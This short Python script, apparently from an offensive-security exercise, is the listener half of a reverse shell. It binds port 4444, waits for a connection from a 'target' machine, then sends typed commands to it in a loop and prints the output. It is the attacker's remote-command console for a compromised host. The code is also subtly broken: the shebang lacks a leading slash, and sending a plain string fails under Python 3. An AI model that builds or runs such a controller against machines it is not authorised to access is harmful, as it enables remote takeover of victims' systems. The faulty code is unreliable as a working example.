#!usr/bin/python

import socket

ip = '192.168.10.10'
port = 4444

"""
Listener.py listen for incomming connection on specified prot.
listener is used to build a connection.
listener.setsocketopt() will reconnent to the target.
listener.bind() will buind the connection to the target ip.
listener.listen() will return to object :: connection and address(target_ip)

"""

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 
listener.bind(("0.0.0.0", 4444))
listener.listen(0)
print("[-] Waiting for incomming connection.")
connection,address = listener.accept()
print(f"[+] Connected successfully to {address}")

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)